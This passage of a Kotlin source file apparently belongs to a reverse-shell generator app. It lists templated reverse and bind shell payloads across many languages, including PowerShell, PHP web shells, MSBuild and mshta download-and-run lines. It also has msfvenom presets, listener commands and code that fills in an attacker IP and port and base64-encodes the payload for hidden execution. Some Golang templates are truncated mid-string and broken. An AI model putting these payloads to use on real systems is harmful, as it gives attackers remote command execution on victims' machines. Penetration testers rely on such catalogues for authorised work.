        ShellPayloadItem("C# PowerShell", "PowerShell", "using System;\nusing System.Diagnostics;\n\nnamespace BackConnect {{\n    class ReversePowerShell {{\n        public static void Main(string[] args) {{\n            Process proc = new System.Diagnostics.Process();\n            proc.StartInfo.FileName = \"powershell.exe\";\n            proc.StartInfo.Arguments = \"-nop -c \\\\\"\$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{{0}};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){{;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}};\$client.Close()\\\\\"\";\n            proc.StartInfo.UseShellExecute = false;\n            proc.StartInfo.RedirectStandardOutput = true;\n            proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;\n            proc.StartInfo.CreateNoWindow = true;\n            proc.Start();\n        }}\n    }}\n}}", ShellPlatform.WINDOWS),
        ShellPayloadItem("PHP PentestMonkey Windows", "PHP", "php -r \"\$sock=fsockopen('{ip}',{port});exec('cmd.exe <&3 >&3 2>&3');\"", ShellPlatform.WINDOWS),
        ShellPayloadItem("PHP Ivan Sincek Windows", "Netcat", "php -r \"\$sock=fsockopen('{ip}',{port});\$proc=proc_open('cmd.exe',array(0=>\$sock,1=>\$sock,2=>\$sock),\$pipes);\"", ShellPlatform.WINDOWS),
        ShellPayloadItem("PHP cmd Windows", "PHP", "<?php if(isset(\$_REQUEST['cmd'])){{ echo \"<pre>\"; \$cmd = (\$_REQUEST['cmd']); system(\$cmd); echo \"</pre>\"; die; }}?>", ShellPlatform.WINDOWS),
        ShellPayloadItem("PHP cmd 2 Windows", "PHP", "<?php if(isset(\$_REQUEST['cmd'])){{ \$cmd = (\$_REQUEST['cmd']); exec(\$cmd, \$output); foreach(\$output as \$line){{ echo \$line.\"<br>\"; }} die; }}?>", ShellPlatform.WINDOWS),
        ShellPayloadItem("PHP cmd small Windows", "PHP", "<?=`\$_GET[0]`?>", ShellPlatform.WINDOWS),
        ShellPayloadItem("PHP system Windows", "PHP", "<?php system(\$_GET['cmd']);?>", ShellPlatform.WINDOWS),
        ShellPayloadItem("PHP backtick Windows", "PHP", "<?php echo `\$_GET['cmd']`;?>", ShellPlatform.WINDOWS),
        ShellPayloadItem("Python Windows", "Python", "python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['cmd.exe']);\"", ShellPlatform.WINDOWS),
        ShellPayloadItem("Python3 Windows", "Python", "python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['cmd.exe']);\"", ShellPlatform.WINDOWS),
        ShellPayloadItem("Ruby Windows", "Ruby", "ruby -rsocket -e \"c=TCPSocket.new('{ip}',{port});while(cmd=c.gets);IO.popen(cmd,'r'){{|io|c.print io.read}}end\"", ShellPlatform.WINDOWS),
        ShellPayloadItem("Perl Windows", "Perl", "perl -MIO -e \"\$c=new IO::Socket::INET(PeerAddr,'{ip}:{port}');STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;\"", ShellPlatform.WINDOWS),
        ShellPayloadItem("Lua Windows", "Lua", "lua -e \"local host, port = '{ip}', {port} local socket = require('socket') local tcp = socket.tcp() local io = require('io') tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read('*a') f:close() tcp:send(s) if status == 'closed' then break end end tcp:close()\"", ShellPlatform.WINDOWS),
        ShellPayloadItem("Golang Windows", "Golang", "echo package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp", ShellPlatform.WINDOWS),
        ShellPayloadItem("Groovy", "Other", "String host=\"{ip}\";\nint port={port};\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}};}};p.destroy();s.close();", ShellPlatform.WINDOWS),
        ShellPayloadItem("ConPtyShell", "Bash / Sh", "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}", ShellPlatform.WINDOWS),
        ShellPayloadItem("Mshta", "Bash / Sh", "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -nop -c \\\\\"\"IEX(New-Object Net.WebClient).downloadString('http://{ip}:{port}/shell.ps1')\\\\\"\"\"\", 0:close\")", ShellPlatform.WINDOWS),
        ShellPayloadItem("Regsvr32", "Windows Native", "regsvr32 /s /n /u /i:http://{ip}:{port}/file.sct scrobj.dll", ShellPlatform.WINDOWS),
        ShellPayloadItem("MSBuild", "Windows Native", "<Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n  <Target Name=\"RevShell\">\n    <RevShellTask/>\n  </Target>\n  <UsingTask TaskName=\"RevShellTask\" TaskFactory=\"CodeTaskFactory\" AssemblyFile=\"C:\\\\Windows\\\\Microsoft.Net\\\\Framework\\\\v4.0.30319\\\\Microsoft.Build.Tasks.v4.0.dll\">\n    <Task>\n      <Code Type=\"Class\" Language=\"cs\">\n        <![CDATA[\n          using System;\n          using System.Net;\n          using System.Net.Sockets;\n          using System.Diagnostics;\n          using System.IO;\n          using Microsoft.Build.Framework;\n          using Microsoft.Build.Utilities;\n          public class RevShellTask : Task {{\n            public override bool Execute() {{\n              using(TcpClient client = new TcpClient(\"{ip}\", {port})) {{\n                using(Stream stream = client.GetStream()) {{\n                  using(StreamReader rdr = new StreamReader(stream)) {{\n                    StreamWriter streamWriter = new StreamWriter(stream);\n                    Process p = new Process();\n                    p.StartInfo.FileName = \"cmd.exe\";\n                    p.StartInfo.CreateNoWindow = true;\n                    p.StartInfo.UseShellExecute = false;\n                    p.StartInfo.RedirectStandardOutput = true;\n                    p.StartInfo.RedirectStandardInput = true;\n                    p.StartInfo.RedirectStandardError = true;\n                    p.OutputDataReceived += (sender, args) => {{\n                      if (!String.IsNullOrEmpty(args.Data)) {{\n                        streamWriter.WriteLine(args.Data);\n                        streamWriter.Flush();\n                      }}\n                    }};\n                    p.Start();\n                    p.BeginOutputReadLine();\n                    while(true) {{\n                      string input = rdr.ReadLine();\n                      p.StandardInput.WriteLine(input);\n                    }}\n                  }}\n                }}\n              }}\n              return true;\n            }}\n          }}\n        ]]>\n      </Code>\n    </Task>\n  </UsingTask>\n</Project>", ShellPlatform.WINDOWS),
        ShellPayloadItem("node.js Windows", "Node.js", "require('child_process').exec('nc.exe -e cmd.exe {ip} {port}')", ShellPlatform.WINDOWS),
        ShellPayloadItem("node.js #2 Windows", "Node.js", "(function(){{\n    var net = require(\"net\"),\n        cp = require(\"child_process\"),\n        sh = cp.spawn(\"cmd.exe\", []);\n    var client = new net.Socket();\n    client.connect({port}, \"{ip}\", function(){{\n        client.pipe(sh.stdin);\n        sh.stdout.pipe(client);\n        sh.stderr.pipe(client);\n    }});\n    return /a/;\n}})();", ShellPlatform.WINDOWS),
        ShellPayloadItem("Java Windows", "Java", "Runtime r = Runtime.getRuntime();\nProcess p = r.exec(\"cmd.exe\");\nSocket s = new Socket(\"{ip}\", {port});\nInputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\nOutputStream po = p.getOutputStream(), so = s.getOutputStream();\nwhile (!s.isClosed()) {{\n  while (pi.available() > 0) so.write(pi.read());\n  while (pe.available() > 0) so.write(pe.read());\n  while (si.available() > 0) po.write(si.read());\n  so.flush();\n  po.flush();\n  Thread.sleep(50);\n  try {{ p.exitValue(); break; }} catch (Exception e) {{}}\n}}\np.destroy();\ns.close();", ShellPlatform.WINDOWS),
        ShellPayloadItem("Haskell Windows", "Other", "module Main where\nimport System.Process\nmain = callCommand \"cmd.exe /c nc.exe {ip} {port} -e cmd.exe\"", ShellPlatform.WINDOWS)
    )

    val BIND_LINUX_PAYLOADS: List<ShellPayloadItem> = listOf(
        ShellPayloadItem("nc Bind Shell", "Netcat", "nc -lvnp {port} -e /bin/sh", ShellPlatform.BIND_LINUX),
        ShellPayloadItem("nc mkfifo Bind", "Netcat", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp {port} >/tmp/f", ShellPlatform.BIND_LINUX),
        ShellPayloadItem("BusyBox nc Bind", "Netcat", "busybox nc -lvnp {port} -e /bin/sh", ShellPlatform.BIND_LINUX),
        ShellPayloadItem("ncat Bind", "Netcat", "ncat -lvnp {port} -e /bin/sh", ShellPlatform.BIND_LINUX),
        ShellPayloadItem("ncat Bind (allow)", "Netcat", "ncat -lvnp {port} --allow {ip} -e /bin/sh", ShellPlatform.BIND_LINUX),
        ShellPayloadItem("socat Bind", "Socat", "socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/sh", ShellPlatform.BIND_LINUX),
        ShellPayloadItem("socat Bind TTY", "Socat", "socat TCP-LISTEN:{port},reuseaddr,fork EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane", ShellPlatform.BIND_LINUX),
        ShellPayloadItem("Python Bind", "Python", "python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\"0.0.0.0\",{port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh", ShellPlatform.BIND_LINUX),
        ShellPayloadItem("Python3 Bind", "Python", "python3 -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\"0.0.0.0\",{port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh", ShellPlatform.BIND_LINUX),
        ShellPayloadItem("Python3 Bind (pty)", "Python", "python3 -c 'import socket,os,pty;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\"0.0.0.0\",{port}));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/sh\")'", ShellPlatform.BIND_LINUX),
        ShellPayloadItem("Perl Bind", "Perl", "perl -e 'use Socket;\$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in(\$p,INADDR_ANY));listen(S,1);accept(C,S);open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");'", ShellPlatform.BIND_LINUX),
        ShellPayloadItem("PHP Bind", "PHP", "php -r '\$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_set_option(\$s,SOL_SOCKET,SO_REUSEADDR,1);socket_bind(\$s,\"0.0.0.0\",{port});socket_listen(\$s,1);\$c=socket_accept(\$s);while(1){{\$cmd=socket_read(\$c,2048);\$out=shell_exec(\$cmd);socket_write(\$c,\$out,strlen(\$out));}}'", ShellPlatform.BIND_LINUX),
        ShellPayloadItem("Ruby Bind", "Ruby", "ruby -rsocket -e 's=TCPServer.new(\"0.0.0.0\",{port});c=s.accept;\$stdin.reopen(c);\$stdout.reopen(c);\$stderr.reopen(c);exec \"/bin/sh -i\"'", ShellPlatform.BIND_LINUX),
        ShellPayloadItem("Node.js Bind", "Node.js", "(function(){{\n    var net = require(\"net\"),\n        cp = require(\"child_process\"),\n        sh = cp.spawn(\"/bin/sh\", []);\n    var server = net.createServer(function(client) {{\n        client.pipe(sh.stdin);\n        sh.stdout.pipe(client);\n        sh.stderr.pipe(client);\n    }});\n    server.listen({port});\n}})();", ShellPlatform.BIND_LINUX),
        ShellPayloadItem("Lua Bind", "Lua", "lua -e \"local s=require('socket');local srv=s.bind('0.0.0.0',{port});local c=srv:accept();while true do local cmd=c:receive();local f=io.popen(cmd,'r');local out=f:read('*a');f:close();c:send(out) end;c:close()\"", ShellPlatform.BIND_LINUX),
        ShellPayloadItem("Golang Bind", "Golang", "echo 'package main;import(\"net\";\"os/exec\";\"net/textproto\");func main(){{l,_:=net.Listen(\"tcp", ShellPlatform.BIND_LINUX),
        ShellPayloadItem("Awk Bind", "AWK", "gawk 'BEGIN {{s=\"/inet/tcp/{port}/0/0\";while(1){{do{{printf \"shell>\" |& s;s |& getline c;if(c){{while((c |& getline)>0)print \$0 |& s;close(c);}}}}while(c != \"exit\");close(s);}}}}'", ShellPlatform.BIND_LINUX),
        ShellPayloadItem("C Bind Shell", "Bash / Sh", "#include <stdio.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <unistd.h>\n\nint main() {{\n    int srv = socket(AF_INET, SOCK_STREAM, 0);\n    int opt = 1;\n    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));\n    struct sockaddr_in addr;\n    addr.sin_family = AF_INET;\n    addr.sin_port = htons({port});\n    addr.sin_addr.s_addr = INADDR_ANY;\n    bind(srv, (struct sockaddr*)&addr, sizeof(addr));\n    listen(srv, 1);\n    int cli = accept(srv, NULL, NULL);\n    dup2(cli, 0);\n    dup2(cli, 1);\n    dup2(cli, 2);\n    execve(\"/bin/sh\", NULL, NULL);\n    return 0;\n}}", ShellPlatform.BIND_LINUX)
    )

    val BIND_WINDOWS_PAYLOADS: List<ShellPayloadItem> = listOf(
        ShellPayloadItem("nc.exe Bind", "Netcat", "nc.exe -lvnp {port} -e cmd.exe", ShellPlatform.BIND_WINDOWS),
        ShellPayloadItem("ncat.exe Bind", "Netcat", "ncat.exe -lvnp {port} -e cmd.exe", ShellPlatform.BIND_WINDOWS),
        ShellPayloadItem("ncat.exe Bind (allow)", "Netcat", "ncat.exe -lvnp {port} --allow {ip} -e cmd.exe", ShellPlatform.BIND_WINDOWS),
        ShellPayloadItem("PowerShell Bind #1", "PowerShell", "powershell -nop -c \"\$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',{port});\$listener.Start();\$client = \$listener.AcceptTcpClient();\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{{0}};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){{;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}};\$client.Close();\$listener.Stop()\"", ShellPlatform.BIND_WINDOWS),
        ShellPayloadItem("PowerShell Bind #2 (hidden)", "PowerShell", "powershell -nop -W hidden -c \"\$l = New-Object System.Net.Sockets.TcpListener([IPAddress]::Any,{port});\$l.Start();\$c = \$l.AcceptTcpClient();\$s = \$c.GetStream();[byte[]]\$b = 0..65535|%{{0}};while((\$i = \$s.Read(\$b, 0, \$b.Length)) -ne 0){{\$d = (New-Object System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r = (iex \$d 2>&1 | Out-String);\$e = ([text.encoding]::ASCII).GetBytes(\$r);\$s.Write(\$e,0,\$e.Length);\$s.Flush()}};\$c.Close();\$l.Stop()\"", ShellPlatform.BIND_WINDOWS),
        ShellPayloadItem("Python Bind Windows", "Python", "python -c \"import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('0.0.0.0',{port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(['cmd.exe'])\"", ShellPlatform.BIND_WINDOWS),
        ShellPayloadItem("Python3 Bind Windows", "Python", "python3 -c \"import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('0.0.0.0',{port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(['cmd.exe'])\"", ShellPlatform.BIND_WINDOWS),
        ShellPayloadItem("Ruby Bind Windows", "Ruby", "ruby -rsocket -e \"s=TCPServer.new('0.0.0.0',{port});c=s.accept;\$stdin.reopen(c);\$stdout.reopen(c);\$stderr.reopen(c);exec 'cmd.exe'\"", ShellPlatform.BIND_WINDOWS),
        ShellPayloadItem("Perl Bind Windows", "Perl", "perl -e \"use Socket;\$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in(\$p,INADDR_ANY));listen(S,1);accept(C,S);open(STDIN,'>&C');open(STDOUT,'>&C');open(STDERR,'>&C');system('cmd.exe');\"", ShellPlatform.BIND_WINDOWS),
        ShellPayloadItem("PHP Bind Windows", "PHP", "php -r \"\$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_set_option(\$s,SOL_SOCKET,SO_REUSEADDR,1);socket_bind(\$s,'0.0.0.0',{port});socket_listen(\$s,1);\$c=socket_accept(\$s);while(1){{\$cmd=socket_read(\$c,2048);\$out=shell_exec(\$cmd);socket_write(\$c,\$out,strlen(\$out));}}\"", ShellPlatform.BIND_WINDOWS),
        ShellPayloadItem("C# Bind Shell", "C / C#", "using System;\nusing System.IO;\nusing System.Net;\nusing System.Net.Sockets;\nusing System.Diagnostics;\n\nclass BindShell {{\n    static void Main() {{\n        TcpListener listener = new TcpListener(IPAddress.Any, {port});\n        listener.Start();\n        TcpClient client = listener.AcceptTcpClient();\n        Stream stream = client.GetStream();\n        StreamReader rdr = new StreamReader(stream);\n        StreamWriter wrt = new StreamWriter(stream);\n        Process p = new Process();\n        p.StartInfo.FileName = \"cmd.exe\";\n        p.StartInfo.CreateNoWindow = true;\n        p.StartInfo.UseShellExecute = false;\n        p.StartInfo.RedirectStandardOutput = true;\n        p.StartInfo.RedirectStandardInput = true;\n        p.StartInfo.RedirectStandardError = true;\n        p.OutputDataReceived += (s, e) => {{ if (!String.IsNullOrEmpty(e.Data)) {{ wrt.WriteLine(e.Data); wrt.Flush(); }} }};\n        p.Start();\n        p.BeginOutputReadLine();\n        while (true) {{ p.StandardInput.WriteLine(rdr.ReadLine()); }}\n    }}\n}}", ShellPlatform.BIND_WINDOWS),
        ShellPayloadItem("Node.js Bind Windows", "Node.js", "(function(){{\n    var net = require(\"net\"),\n        cp = require(\"child_process\"),\n        sh = cp.spawn(\"cmd.exe\", []);\n    var server = net.createServer(function(client) {{\n        client.pipe(sh.stdin);\n        sh.stdout.pipe(client);\n        sh.stderr.pipe(client);\n    }});\n    server.listen({port});\n}})();", ShellPlatform.BIND_WINDOWS),
        ShellPayloadItem("Lua Bind Windows", "Lua", "lua -e \"local s=require('socket');local srv=s.bind('0.0.0.0',{port});local c=srv:accept();while true do local cmd=c:receive();local f=io.popen(cmd,'r');local out=f:read('*a');f:close();c:send(out) end;c:close()\"", ShellPlatform.BIND_WINDOWS),
        ShellPayloadItem("Golang Bind Windows", "Golang", "echo package main;import(\"net\";\"os/exec\");func main(){{l,_:=net.Listen(\"tcp", ShellPlatform.BIND_WINDOWS)
    )

    val ALL_PAYLOADS: List<ShellPayloadItem> by lazy {
        LINUX_PAYLOADS + WINDOWS_PAYLOADS + BIND_LINUX_PAYLOADS + BIND_WINDOWS_PAYLOADS
    }

    val MSFVENOM_PRESETS: List<MsfvenomPreset> = listOf(
        MsfvenomPreset("Linux x64 Meterpreter Reverse TCP", "linux/x64/meterpreter/reverse_tcp", "elf", "linux", "elf"),
        MsfvenomPreset("Linux x64 Shell Reverse TCP", "linux/x64/shell_reverse_tcp", "elf", "linux", "elf"),
        MsfvenomPreset("Linux x86 Meterpreter Reverse TCP", "linux/x86/meterpreter/reverse_tcp", "elf", "linux", "elf"),
        MsfvenomPreset("Windows x64 Meterpreter Reverse TCP", "windows/x64/meterpreter/reverse_tcp", "exe", "windows", "exe"),
        MsfvenomPreset("Windows x64 Meterpreter HTTPS", "windows/x64/meterpreter/reverse_https", "exe", "windows", "exe"),
        MsfvenomPreset("Windows x64 Shell Reverse TCP", "windows/x64/shell_reverse_tcp", "exe", "windows", "exe"),
        MsfvenomPreset("Windows x86 Meterpreter Reverse TCP", "windows/meterpreter/reverse_tcp", "exe", "windows", "exe"),
        MsfvenomPreset("Windows DLL x64 Meterpreter", "windows/x64/meterpreter/reverse_tcp", "dll", "windows", "dll"),
        MsfvenomPreset("Windows MSI x64 Installer", "windows/x64/meterpreter/reverse_tcp", "msi", "windows", "msi"),
        MsfvenomPreset("Windows PowerShell Base64", "windows/x64/meterpreter/reverse_tcp", "psh-net", "windows", "ps1"),
        MsfvenomPreset("PHP Meterpreter Reverse TCP", "php/meterpreter_reverse_tcp", "raw", "php", "php"),
        MsfvenomPreset("PHP Reverse PHP (Staged)", "php/reverse_php", "raw", "php", "php"),
        MsfvenomPreset("Java JSP Reverse TCP", "java/jsp_shell_reverse_tcp", "raw", "java", "jsp"),
        MsfvenomPreset("Java WAR Web Archive", "java/meterpreter/reverse_tcp", "war", "java", "war"),
        MsfvenomPreset("Python Meterpreter Reverse TCP", "python/meterpreter_reverse_tcp", "raw", "python", "py"),
        MsfvenomPreset("macOS x64 Meterpreter Reverse TCP", "osx/x64/meterpreter/reverse_tcp", "macho", "osx", "macho"),
        MsfvenomPreset("Android Meterpreter Reverse TCP", "android/meterpreter/reverse_tcp", "raw", "android", "apk")
    )

    val LISTENER_TOOLS: List<String> = listOf(
        "nc",
        "rlwrap nc",
        "ncat",
        "ncat (ssl)",
        "pwncat",
        "socat (tty)",
        "msfconsole"
    )

    fun getPayloads(platform: ShellPlatform): List<ShellPayloadItem> {
        return when (platform) {
            ShellPlatform.LINUX -> LINUX_PAYLOADS
            ShellPlatform.WINDOWS -> WINDOWS_PAYLOADS
            ShellPlatform.BIND_LINUX -> BIND_LINUX_PAYLOADS
            ShellPlatform.BIND_WINDOWS -> BIND_WINDOWS_PAYLOADS
            ShellPlatform.MSFVENOM -> emptyList()
        }
    }

    fun getCategories(platform: ShellPlatform): List<String> {
        return getPayloads(platform).map { it.category }.distinct()
    }

    fun generatePayload(
        item: ShellPayloadItem,
        ip: String,
        port: String,
        shell: String,
        encoding: PayloadEncoding
    ): String {
        return generatePayload(
            template = item.template,
            ip = ip,
            port = port,
            shellBinary = shell,
            encoding = encoding.displayName
        )
    }

    fun generatePayload(
        template: String,
        ip: String,
        port: String,
        shellBinary: String = "/bin/sh",
        encoding: String = "None"
    ): String {
        var result = template
            .replace("{ip}", ip.trim().ifBlank { "10.10.10.10" })
            .replace("{port}", port.trim().ifBlank { "4444" })

        // Apply shell binary override if applicable
        if (shellBinary.isNotBlank()) {
            if (result.contains("/bin/sh") && shellBinary != "/bin/sh") {
                result = result.replace("/bin/sh", shellBinary)
            } else if (result.contains("/bin/bash") && shellBinary != "/bin/bash") {
                result = result.replace("/bin/bash", shellBinary)
            } else if (result.contains("cmd.exe") && shellBinary != "cmd.exe") {
                result = result.replace("cmd.exe", shellBinary)
            }
        }

        // Apply encoding
        return when (encoding) {
            "URL" -> urlEncode(result)
            "Double URL" -> urlEncode(urlEncode(result))
            "Base64" -> {
                val b64 = Base64.encodeToString(result.toByteArray(StandardCharsets.UTF_8), Base64.NO_WRAP)
                if (result.contains("powershell") || result.contains("cmd")) {
                    // For Windows UTF-16LE powershell
                    val b64Unicode = Base64.encodeToString(result.toByteArray(StandardCharsets.UTF_16LE), Base64.NO_WRAP)
                    "powershell -nop -w hidden -e $b64Unicode"
                } else {
                    "echo $b64 | base64 -d | sh"
                }
            }
            else -> result
        }
    }

    fun generateListener(tool: String, port: String, ip: String = ""): String {
        val p = port.trim().ifBlank { "4444" }
        return when (tool) {
            "nc" -> "nc -lvnp $p"
            "ncat" -> "ncat -lvnp $p"
            "ncat (ssl)" -> "ncat --ssl -lvnp $p"
            "pwncat" -> "pwncat-cs -lp $p"
            "rlwrap nc" -> "rlwrap nc -lvnp $p"
            "socat (tty)" -> "socat file:`tty`,raw,echo=0 tcp-listen:$p"
            "msfconsole" -> "msfconsole -q -x \"use exploit/multi/handler; set payload generic/shell_reverse_tcp; set LHOST ${if (ip.isNotBlank()) ip else "0.0.0.0"}; set LPORT $p; run\""
            else -> "nc -lvnp $p"
        }
    }

    fun generateMsfvenom(preset: MsfvenomPreset, ip: String, port: String): Pair<String, String> {
        val currentIp = ip.trim().ifBlank { "10.10.10.10" }
        val currentPort = port.trim().ifBlank { "4444" }
        val msfvenomCmd = "msfvenom -p ${preset.payload} LHOST=$currentIp LPORT=$currentPort -f ${preset.format} -o shell.${preset.extension}"
        val handlerCmd = "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD ${preset.payload}; set LHOST $currentIp; set LPORT $currentPort; run\""
        return Pair(msfvenomCmd, handlerCmd)
    }

    fun generateMsfvenom(preset: MsfvenomPreset, ip: String, port: String, encoder: String = "", iterations: Int = 1): String {
        val currentIp = ip.trim().ifBlank { "10.10.10.10" }
        val currentPort = port.trim().ifBlank { "4444" }
        val sb = StringBuilder("msfvenom -p ${preset.payload} LHOST=$currentIp LPORT=$currentPort -f ${preset.format}")
        if (encoder.isNotBlank()) {
            sb.append(" -e $encoder -i $iterations")
        }
        sb.append(" -o shell.${preset.extension}")
        return sb.toString()
    }

    private fun urlEncode(str: String): String {
        return try {
            URLEncoder.encode(str, StandardCharsets.UTF_8.toString())
                .replace("+", "%20")
        } catch (e: Exception) {
            str
        }
    }
}

typealias ReverseShellRepository = ReverseShellData
